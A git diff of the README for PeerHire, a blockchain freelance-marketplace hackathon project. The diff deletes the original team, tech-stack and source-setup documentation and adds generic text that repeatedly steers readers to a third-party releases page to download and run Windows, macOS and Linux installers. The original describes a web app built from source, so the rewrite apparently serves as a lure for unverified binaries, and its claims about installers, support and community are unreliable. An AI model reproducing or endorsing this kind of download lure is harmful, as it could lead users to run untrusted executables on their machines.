@@ -1,253 +1,72 @@
-![github-submission-banner](https://github.com/user-attachments/assets/a1493b84-e4e2-456e-a791-ce35ee2bcf2f)
+# 🎉 peer_hire_hackhazards_25 - Simplifying Freelance Transactions
 
-# 🚀 PeerHire: Decentralized Freelance Marketplace
+## 🚀 Getting Started
 
-> Connecting freelancers and clients securely through blockchain and AI.
+Welcome to the PeerHire application! This tool makes it easy for you to trust and verify freelance jobs using blockchain technology. With our solution, you can engage in secure transactions and find the best matches for your tasks.
 
----
+## 📥 Download
 
-## 📌 Problem Statement
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/shura-gh0st69/peer_hire_hackhazards_25/releases)
 
-**Problem Statement 4 – Craft the Future of Onchain Consumer Experiences with Base**
+## 🛠️ System Requirements
 
----
+To run the PeerHire application, ensure your system meets the following requirements:
 
-## 🎯 Objective
+- **Operating System:** Windows 10 or newer, macOS 10.14 or newer, or a compatible Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB free disk space.
+- **Network:** A stable internet connection for blockchain interaction.
 
-PeerHire solves the problem of trust and transparency in freelance marketplaces by leveraging blockchain for secure transactions and AI for intelligent job matching and task verification.
+## 📖 Features
 
----
+1. **Secure Transactions:** Utilizing blockchain ensures that all transactions are transparent and unchangeable.
+2. **Job Matching Algorithm:** AI matches you with suitable freelance jobs based on your skills and preferences.
+3. **Task Verification:** The application verifies tasks to ensure that the work delivered meets your expectations.
+4. **User-Friendly Interface:** Designed for ease of use, the application is accessible for users at all skill levels.
 
-## 🧠 Team & Approach
+## 📜 How to Download & Install
 
-### Team Name
+1. **Visit the Releases Page:** 
+   Go to our [Releases Page](https://github.com/shura-gh0st69/peer_hire_hackhazards_25/releases) to find the latest version of the application. 
 
-`Team Undefined`
+2. **Choose Your Version:**
+   Select the release that suits your operating system. You will find options for Windows, macOS, and Linux. Each release will have a detailed description, so you know what you are downloading.
 
-### Team Members
+3. **Download the Installer:**
+   Click on the download link for your chosen version. Your browser will start the download automatically. 
 
-- Jaykumar Patel (Fullstack Dev | The Blockchain Guy | Groq Guy)
-- V Meghashreee (Frontend Lead | Screenpipe Integration | Blockchain Contributor | Backend Bug Hunter)
-- Tejaswini S (Backend Dev)
-- Priyanshi Bhardwaj (AI Specialist)
+4. **Run the Installer:**
+   Navigate to your downloads folder and double-click on the downloaded installer file. 
+   - For Windows, this file usually has a `.exe` extension.
+   - For macOS, look for a `.dmg` file.
+   - For Linux, it may be a `.tar.gz` file or a package file, depending on your distribution.
 
-### Your Approach
+5. **Follow the Installation Steps:**
+   - For Windows and macOS: A setup guide will appear. Follow the on-screen instructions to complete the installation.
+   - For Linux: You may need to extract the files and run a command to install. Follow the provided instructions in the setup guide.
 
-- Key challenges included integrating blockchain payments and AI verification.
-- A breakthrough was using Screenpipe's AI for task verification, ensuring trust.
+6. **Launch the Application:**
+   After installation, you will find the PeerHire application in your applications folder or on your desktop. Click the app icon to launch it.
 
----
+7. **Create Your Account:**
+   Upon launching, create an account to start using the application. The setup is straightforward and requires only a few basic details.
 
-## 🛠️ Tech Stack
+## 🎯 Tips for Using PeerHire
 
-### Core Technologies Used
+- **Explore the Dashboard:** Once logged in, explore the dashboard to familiarize yourself with available features.
+- **Set Your Preferences:** Make sure to set your job preferences for the best matches.
+- **Stay Updated:** Regularly check our releases page for updates, which include new features and security improvements.
 
-- Frontend: React, TypeScript, Tailwind CSS
-- Backend: Hono (Node.js)
-- Database: MongoDB
-- APIs: Groq API, Screenpipe API, Coinbase API
-- Blockchain: Base (Layer 2)
-- Authentication: Wallet-based (Smart-Wallet, Coinbase)
-- Hosting: Render (Frontend), Render (Backend)
+## 🤝 Support
 
-### Sponsor Technologies Used
+If you encounter issues or have questions, please reach out to our support team via the "Issues" section on our GitHub page. We aim to respond promptly and help you with any concerns.
 
-- [✅] **Groq:** Used for AI job recommendations and chatbot.
-- [✅] **Base:** Implemented OnchainKit for wallet connections.
-- [✅] **Screenpipe:** Integrated for screen recording and AI verification.
+## 💡 Contribution
 
----
+We welcome contributions from users who want to enhance the PeerHire application. If you wish to contribute, check our guidelines in the "Contributing" section on GitHub. 
 
-## ✨ Key Features
+## 🌐 Community 
 
-- ✅ Wallet-based authentication
-- ✅ AI-powered job recommendations
-- ✅ Blockchain-secured payments
-- ✅ AI-driven task verification
+Join our community of users on our Discord server. Connect with fellow users to share experiences, ask for advice, and stay engaged with updates.
 
----
-
-## 📽️ Demo & Deliverables
-
-- **Demo Video Link:** [YouTube Link]
-- **Pitch Deck / PPT Link:** [Google Slides Link]
-
----
-
-## 🧪 Project Setup Instructions
-
-### Prerequisites
-
-- Node.js v18+
-- MongoDB Atlas account
-- Bun (JavaScript runtime and package manager)
-- Foundry (for smart contract development)
-- API Keys:
-  - Groq API
-  - Screenpipe API
-  - Coinbase Platform API
-
-### 1. Backend Setup
-
-```bash
-# Navigate to the backend directory
-cd backend
-
-# Install dependencies
-bun install
-
-# Create .env file with the following variables
-touch .env
-```
-
-Required environment variables for backend:
-
-```
-# Required
-MONGODB_URI=mongodb://localhost:27017/peerhire
-JWT_SECRET=your_jwt_secret_key
-JWT_EXPIRATION=7d
-
-# API Keys
-GROQ_API_KEY=your_groq_api_key
-SCREENPIPE_API_KEY=your_screenpipe_api_key
-
-# Optional for demo mode
-DEMO_MODE=true
-DEMO_CLIENT_EMAIL=demo.client@example.com
-DEMO_CLIENT_PASSWORD=demoClient123
-DEMO_FREELANCER_EMAIL=demo.freelancer@example.com
-DEMO_FREELANCER_PASSWORD=demoFreelancer123
-```
-
-```bash
-# Start the backend server
-bun run dev
-```
-
-### 2. Frontend Setup
-
-```bash
-# Navigate to the frontend directory
-cd frontend
-
-# Install dependencies
-bun install
-
-# Create .env file
-touch .env
-```
-
-Required environment variables for frontend:
-
-```
-VITE_API_BASE_URL=http://localhost:3000/api
-VITE_COINBASE_APP_ID=your_coinbase_app_id
-VITE_BASE_CHAIN_ID=84532
-```
-
-```bash
-# Start the frontend application
-bun run dev
-```
-
-### 3. Smart Contracts Setup
-
-```bash
-# Navigate to the smart_contracts directory
-cd smart_contracts
-
-# Install Foundry dependencies
-forge install
-
-# Compile contracts
-forge build
-
-# Run tests
-forge test
-
-# Deploy contracts (to local development environment)
-forge script script/Deploy.s.sol --rpc-url http://localhost:8545 --private-key <your_private_key>
-```
-
-For Base Sepolia Testnet deployment:
-
-```bash
-# Setup .env file
-touch .env
-```
-
-Required environment variables for smart contracts:
-
-```
-PRIVATE_KEY=your_private_key
-BASE_SEPOLIA_RPC_URL=https://sepolia.base.org
-ETHERSCAN_API_KEY=your_etherscan_api_key
-```
-
-```bash
-# Deploy to Base Sepolia Testnet
-forge script script/Deploy.s.sol --rpc-url $BASE_SEPOLIA_RPC_URL --private-key $PRIVATE_KEY --verify --etherscan-api-key $ETHERSCAN_API_KEY
-```
-
-### 4. Running the Entire Application
-
-```bash
-# From the root directory
-# Install all dependencies
-bun install
-
-# Start all services concurrently
-bun run dev
-```
-
----
-
-## 📡 API Integration Details
-
-### Groq AI Integration
-
-The backend utilizes Groq's LLM API for:
-
-- Job matching and recommendations
-- Skills assessment and verification
-- Intelligent chatbot assistance
-
-### Coinbase OnchainKit Integration
-
-The frontend integrates with Coinbase's OnchainKit for:
-
-- Wallet authentication
-- Transaction signing
-- Payment processing on Base network
-- Smart contract interaction
-
-### Screenpipe Integration
-
-Used for:
-
-- Work verification through screen recording
-- AI analysis of work patterns
-- Proof of work validation
-
----
-
-## 🧬 Future Scope
-
-- 📈 Integration with more blockchains
-- 🛡️ Enhanced security with zero-knowledge proofs
-- 🌐 Support for multiple languages
-
----
-
-## 📎 Resources / Credits
-
-- APIs: Groq, Screenpipe
-- Libraries: Ethers.js, React Query, OnchainKit
-- Acknowledgements: Thanks to the hackathon organizers and sponsors!
-
----
-
-## 🏁 Final Words
-
-Our journey was filled with late-night coding sessions and breakthrough moments. We learned a lot about decentralized technologies and are excited to see PeerHire grow!
+Remember to visit our [Releases Page](https://github.com/shura-gh0st69/peer_hire_hackhazards_25/releases) for the latest version to download. Enjoy using PeerHire to enhance your freelance experience!
